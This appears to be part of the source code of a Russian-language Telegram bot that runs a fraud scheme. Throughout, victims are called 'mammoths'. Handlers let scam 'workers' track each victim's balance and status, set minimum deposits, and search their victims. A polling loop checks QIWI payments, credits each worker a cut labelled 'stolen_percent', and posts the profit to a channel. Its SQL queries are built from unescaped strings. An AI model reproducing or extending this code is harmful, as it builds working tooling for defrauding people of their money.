        texts.mamont_info.format(name=item[9], balance=item[2], referals_mamont=item[14], status=states[item[11]],
                                 log_mamont=item[13]),
        reply_markup=kb.mamont_set_kb(call.data.split()[1], 1), inline_message_id=call.inline_message_id)


@dp.callback_query_handler(lambda c: c.data.startswith('check_mamont') or c.data.startswith('back_to_mamont'))
async def mamont_info(call: types.CallbackQuery, state: FSMContext):
    item = db.get_user_by_user_id(call.data.split()[1])
    await call.message.edit_text(
        texts.mamont_info.format(name=item[9], balance=item[2], referals_mamont=item[14], status=states[item[11]],
                                 log_mamont=item[13]),
        reply_markup=kb.mamont_set_kb(call.data.split()[1], 1))


@dp.callback_query_handler(text_startswith='change_status')
async def change_mamont_status(call: types.CallbackQuery):
    status = db.get_user_block_status(call.data.split()[1])
    await bot.edit_message_text(f'''Текущий статус мамонта: {states[status]}
🔖 Выберите новый статус:''', reply_markup=kb.mamont_set_state_kb(call.data.split()[1]),
                                    inline_message_id=call.inline_message_id)


@dp.callback_query_handler(text_startswith='set_state')
async def set_mamont_state(call: types.CallbackQuery, state: FSMContext):
    db.set_user_block_status(str(call.data.split()[2]), call.data.split()[1])
    item = db.get_user_by_user_id(call.data.split()[2])
    await bot.edit_message_text(text=texts.mamont_info.format(name=item[9], balance=item[2], referals_mamont=item[14],
                                                              status=states[item[11]], log_mamont=item[13]), inline_message_id=call.inline_message_id,
                                    reply_markup=kb.mamont_set_kb(item[1]))

@dp.callback_query_handler(text_startswith='del_mamont')
async def del_mamont(call: types.CallbackQuery):
    m_id = call.data.split()[1]
    await bot.send_message(call.from_user.id, '<b>Вы точно хотите удалить мамонта?</b>', reply_markup=kb.InlineKeyboardMarkup().add(
        kb.InlineKeyboardButton('Да', callback_data=f'del_agree {m_id}'),
        kb.InlineKeyboardButton('Нет', callback_data=f'del_disagree {m_id}')
    ))

@dp.callback_query_handler(text_startswith='del_agree')
async def del_mamont(call: types.CallbackQuery):
    db.del_referer(call.data.split()[1])
    await bot.send_message(call.from_user.id, '<b>Вы успешно удалили мамонта!</b>')
    await call.message.delete()

@dp.callback_query_handler(text_startswith='del_disagree')
async def del_mamont(call: types.CallbackQuery):
    await call.message.delete()

@dp.callback_query_handler(text_startswith='min_depos')
async def min_depos(call: types.CallbackQuery, state: FSMContext):
    await States.min_depos_state.set()
    await call.message.answer('Укажите минимальный депозит для мамонтов:')

@dp.message_handler(state=States.min_depos_state)
async def depos_set(msg: types.Message, state: FSMContext):
    data = msg.text
    db.change_min_depos(msg.from_user.id, data)
    await state.finish()
    await msg.answer('Вы успешно поменяли мин. депозит! ✅')

@dp.inline_handler()
async def get_my_mamonts(query: types.InlineQuery, state: FSMContext):
    if query.query.startswith('m='):
        status = db.get_user_by_user_id(query.from_user.id)[7]
        if status == 1:
            user_mamonts = db.get_referals(query.from_user.id)
        elif status == 2:
            user_mamonts = db.get_all_users()
        without_m = re.sub(r'^m=', '', query.query).lower()
        articles = []
        asd = 0
        for item in user_mamonts:
            if re.search(without_m, str(item[8]).lower()) or re.search(without_m, str(item[1]).lower()):
                log_status = 'Включено' if item[13] else 'Выключено'
                articles.append(types.InlineQueryResultArticle(
                    id=item[1],
                    title=item[8],
                    thumb_url='https://i.imgur.com/zeth7u2.png',
                    hide_url=True,
                    description=item[9],
                    input_message_content=types.InputMessageContent(
                    message_text=texts.mamont_info.format(name=item[9], balance=item[2], referals_mamont=item[14],
                                                                  status=states[item[11]], log_mamont=log_status)),
                        reply_markup=kb.mamont_set_kb(item[1])
                    ))
        await query.answer(articles, 20, True)



async def checkmoney():
    while True:
        try:
            qiwi_tokens = db.cursor.execute('SELECT * FROM qiwi_tokens WHERE is_active=1').fetchone()
            p2p = AioQiwiP2P(
                auth_key=qiwi_tokens[2])
            active_bills = db.cursor.execute('SELECT * FROM bills WHERE state=0').fetchall()
            for bill in active_bills:
                bill_status = await p2p.check(bill[0])
                if bill_status.status == 'REJECTED' or bill_status.status == 'EXPIRED':
                    db.cursor.execute(f'DELETE FROM bills WHERE bill_id={bill[0]}')
                    db.conn.commit()
                elif bill_status.status == 'PAID':
                    mamont = db.get_user_by_user_id(bill[2])
                    worker = db.get_user_by_user_id(mamont[4])
                    db.cursor.execute(f'UPDATE bills SET state=1 WHERE bill_id={bill[0]}')
                    db.add_user_balance_user_id(bill[2], bill_status.amount)
                    text = ''
                    if bill[3]:
                        worker_percent = int(str(bill_status.amount).split('.')[0]) - ((int(str(bill_status.amount).split('.')[0]) / 100) * 40)
                        text = texts.mamont_payment_adv.format(money=bill_status.amount, stolen_percent=worker_percent, percent='40', worker='Тех.поддержка', mamont=mamont[1], worker_id=worker[1])
                    else:
                        worker_percent = int(str(bill_status.amount).split('.')[0]) - (
                                    (int(str(bill_status.amount).split('.')[0]) / 100) * percent)
                        text = texts.mamont_payment_adv.format(money=bill_status.amount, stolen_percent=worker_percent, percent=percent, worker=worker[8], mamont=mamont[1], worker_id=worker[1])
                    db.cursor.execute(f'UPDATE users SET (all_worker_balance, money_from_mamonts) = (all_worker_balance+{worker_percent}, money_from_mamonts+{worker_percent}) WHERE user_id={mamont[4]}')
                    db.conn.commit()
                    await bot.send_message(profit_channel, text)
                    await bot.send_message(bill[2], f'✅ Обнаружено пополнение на Ваш счёт!\n💸 Сумма: {bill_status.amount}₽')
                    if db.user_is_worker(mamont[4]):
                        await bot.send_message(worker[1], text)
            await asyncio.sleep(10)
        except Exception as e:
            print(e)


loop = asyncio.get_event_loop()
loop.create_task(checkmoney())
